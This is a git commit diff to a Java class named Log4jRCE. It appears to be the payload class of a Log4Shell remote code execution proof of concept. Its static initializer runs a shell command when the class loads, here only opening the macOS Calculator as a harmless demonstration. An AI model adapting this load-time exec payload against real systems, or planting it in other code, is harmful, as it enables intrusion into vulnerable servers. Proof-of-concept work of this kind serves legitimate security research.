70b7ba866a7ab24180c08102281c7cd569f8a780
Lingfan.jys <yongshunjin.jys@alibaba-inc.com>
2021-12-10 16:56:17 +0800

    update rce

--- src/main/java/Log4jRCE.java
+++ src/main/java/Log4jRCE.java
@@ -1,10 +1,11 @@
 public class Log4jRCE {
     static {
         try {
-            String [] cmd={"open -a /System/Applications/Calculator.app"};
-            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
-        }catch (Exception e){
-            e.printStackTrace();
+            String var0 = "open /System/Applications/Calculator.app";
+            Runtime.getRuntime().exec(var0);
+        } catch (Exception var1) {
+            var1.printStackTrace();
         }
+        System.out.println();
     }
 }
